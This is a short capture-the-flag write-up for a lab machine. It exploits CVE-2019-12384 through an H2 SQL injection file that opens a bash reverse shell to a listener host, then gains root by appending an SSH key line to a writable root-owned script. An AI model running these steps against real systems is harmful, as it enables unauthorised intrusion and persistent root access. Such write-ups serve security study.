# User
## Exploiting

I intercepted the reqest to the website with Burp Suite and according to this [github](https://github.com/jas502n/CVE-2019-12384) put following as request:

> look at the json in the data! Explained [here](http://www.h2database.com/html/features.html#execute_sql_on_connection)

```

```

Furthermore I created a `inject.sql` with this content:

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInpu
tStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('setsid bash -i &>/dev/tcp/10.10.14.25/4444 0>&1 &')
```

and provided this sql with a webservice started with 

```
python3 -m http.server
```

Simultaneously I started a listener with: 
 
```
nc -lvnp 4444
```

Now I sended the request in BurpSuite and got the reverse shell where I started the listener before

# Root
`/usr/bin/timer_backup.sh` is owned by root and writeable.

Upload the pubkey.
```
echo "echo SSH_PUB_KEY >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
```
SSH into the box with root
```
ssh -i ~/.ssh/id_rsa root@10.10.10.214
```
